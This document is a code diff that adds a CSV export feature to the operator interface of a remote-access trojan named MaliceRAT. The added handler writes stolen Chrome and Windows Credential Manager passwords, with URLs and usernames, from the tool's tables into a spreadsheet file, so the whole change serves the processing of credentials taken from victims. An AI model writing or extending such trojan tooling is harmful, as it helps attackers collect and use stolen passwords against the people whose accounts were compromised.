@@ -3,6 +3,8 @@ using System.Windows.Forms;
 using System.Collections.Generic;
 using System.Web.Script.Serialization;
 using MaliceRAT.RatServer;
+using System.IO;
+using System.Text;
 
 namespace MaliceRAT.RatUI
 {
@@ -66,5 +68,38 @@ namespace MaliceRAT.RatUI
             public List<CredentialModel> wcm { get; set; }
         }
         #endregion
+
+        private void exportAsCsvButton_Click(object sender, EventArgs e)
+        {
+            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
+            {
+                saveFileDialog.Filter = "CSV files (*.csv)|*.csv";
+                saveFileDialog.FilterIndex = 1;
+                saveFileDialog.RestoreDirectory = true;
+
+                if (saveFileDialog.ShowDialog() == DialogResult.OK)
+                {
+                    string filePath = saveFileDialog.FileName;
+                    using (StreamWriter sw = new StreamWriter(filePath, false, Encoding.UTF8))
+                    {
+                        sw.WriteLine("Source,URL,Username,Password");
+
+                        // Export Chrome passwords
+                        foreach (DataGridViewRow row in gunaChromePasswordsTable.Rows)
+                        {
+                            sw.WriteLine($"Chrome,{row.Cells[0].Value},{row.Cells[1].Value},{row.Cells[2].Value}");
+                        }
+
+                        // Export WCM passwords
+                        foreach (DataGridViewRow row in gunaWCMPasswordsTable.Rows)
+                        {
+                            sw.WriteLine($"WCM,{row.Cells[0].Value},{row.Cells[1].Value},{row.Cells[2].Value}");
+                        }
+                    }
+
+                    MessageBox.Show("Passwords exported successfully!", "Export Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+            }
+        }
     }
 }
